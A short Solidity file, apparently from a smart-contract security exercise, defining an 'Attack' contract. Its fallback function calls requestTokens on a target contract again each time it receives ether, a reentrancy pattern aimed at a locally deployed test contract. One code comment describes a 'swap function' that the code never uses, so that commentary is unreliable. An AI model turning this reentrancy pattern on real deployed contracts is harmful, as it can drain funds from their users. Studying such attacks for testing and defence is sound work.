pragma solidity 0.8.20;
import "./ERC.sol";
import "hardhat/console.sol";

contract Attack {
    function attack(address _target) public {
        ERC erc = ERC(_target);
        erc.requestTokens();
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {
        // console.log("Fallback function called", a);
        // This contract will try to call the swap function of the ERC contract
        // but it will fail because the swap function is not marked as public
        ERC erc = ERC(0x5FbDB2315678afecb367f032d93F642f64180aa3);
        erc.requestTokens();
    }
}
